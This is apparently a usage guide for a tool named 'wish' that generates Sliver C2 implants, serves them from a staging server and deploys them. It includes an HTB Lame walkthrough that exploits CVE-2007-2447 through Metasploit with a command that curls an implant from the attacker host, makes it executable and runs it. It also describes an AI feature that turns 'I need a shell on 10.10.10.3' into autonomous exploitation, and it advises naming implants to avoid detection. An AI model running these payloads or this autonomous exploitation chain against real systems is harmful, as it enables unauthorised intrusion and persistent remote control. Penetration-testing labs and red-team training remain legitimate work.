# Sliver Implant Deployment Guide

This guide explains how to generate and deploy Sliver implants using wish.

## Overview

wish integrates with the Sliver C2 framework to provide:

1. **Implant Generation**: Generate customizable implant binaries
2. **Staging Server**: HTTP server for implant distribution
3. **Automated Deployment**: Automated implant deployment using RCE vulnerabilities
4. **Session Management**: Manage connected implants

## Prerequisites

- Sliver C2 server is running
- `~/.sliver-client/configs/wish-test.cfg` is configured
- Access to target network

## Implant Generation

### Basic Usage

```bash
/sliver generate --host <callback_host> [options]
```

### Options

- `--host, -h`: Callback host (required)
- `--port, -p`: Callback port (default: 443)
- `--os, -o`: Target OS (linux/windows/darwin)
- `--arch, -a`: Architecture (amd64/x86/arm64)
- `--format, -f`: Output format (exe/shellcode/shared/service)
- `--protocol`: C2 protocol (https/http/tcp/dns)
- `--name, -n`: Implant name (auto-generated if not specified)

### Examples

```bash
# Generate Linux implant
/sliver generate --host 10.10.14.2 --os linux --name LINUX_IMPLANT

# Generate Windows implant (port 8443)
/sliver generate --host 192.168.1.100 --os windows --port 8443 --name WIN_IMPLANT
```

## Staging Server

You can start an HTTP server to distribute generated implants.

### Starting the Server

```bash
/sliver staging start [port]
```

Defaults to port 8080.

### Server Management

```bash
# Show active servers
/sliver staging list

# Stop server
/sliver staging stop <server_id>
```

### Usage Example

```bash
# Start staging server
/sliver staging start 8080

# Example output:
✓ Staging server started
Server ID: a1b2c3d4
URL: http://0.0.0.0:8080
Serving: /home/user/.wish/implants

Available implants:
  • LINUX_IMPLANT: http://localhost:8080/LINUX_IMPLANT
  • WIN_IMPLANT: http://localhost:8080/WIN_IMPLANT.exe
```

## HTB Lame Deployment Example

Complete example of implant deployment to HTB Lame (10.10.10.3):

### 1. Verify Attacker IP

```bash
# Check HTB VPN interface IP
ip addr show tun0
```

### 2. Generate Implant

```bash
/sliver generate --host 10.10.14.2 --os linux --name LAME_EXPLOIT
```

### 3. Start Staging Server

```bash
/sliver staging start 8080
```

### 4. Exploit Vulnerability

Exploit SMB username_map script vulnerability (CVE-2007-2447):

```bash
# Using Metasploit
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set PAYLOAD cmd/unix/generic
set CMD "curl -sSL http://10.10.14.2:8080/LAME_EXPLOIT -o /tmp/svc && chmod +x /tmp/svc && /tmp/svc"
run
```

### 5. Verify Session

```bash
# Check for new session
/sliver implants

# Connect to session
/sliver shell LAME_EXPLOIT
```

## Automated Workflow

Automated deployment using wish's AI capabilities:

```bash
# Instruct the AI
> I need a shell on 10.10.10.3

# wish automatically executes:
# 1. Generate appropriate implant
# 2. Start staging server
# 3. Exploit vulnerability to deploy implant
# 4. Verify session connection
```

## Security Considerations

1. **Communication Encryption**: Use HTTPS protocol in production
2. **Port Selection**: Consider firewall rules
3. **Implant Names**: Use generic names to avoid detection
4. **Cleanup**: Always delete implants and servers after testing

```bash
# Delete implant (managed on Sliver side)
# Stop staging server
/sliver staging stop <server_id>
```

## Troubleshooting

### Implant Generation Error

```
Error: Failed to generate implant
```

Solutions:
- Verify Sliver C2 server is running
- Check configuration file path is correct
- Review `sliver-server` logs

### Staging Server Error

```
Error: Failed to start staging server: Address already in use
```

Solutions:
- Specify different port: `/sliver staging start 8081`
- Check processes using port: `lsof -i :8080`

### No Session Connection

- Check firewall settings
- Verify callback host is correct
- Check implant logs (on target side)

## Best Practices

1. **Environment-specific Settings**: Use different settings for dev/production
2. **Logging**: Log all operations
3. **Regular Cleanup**: Remove unnecessary implants
4. **Access Control**: Set appropriate permissions on Sliver configuration files

## References

- [Sliver Official Documentation](https://github.com/BishopFox/sliver/wiki)
- [wish Sliver Integration Specification](../project/02d-ui-sliver.md)
- [HTB Lame Demo Scenario](../demo/htb-lame-demo-script.md)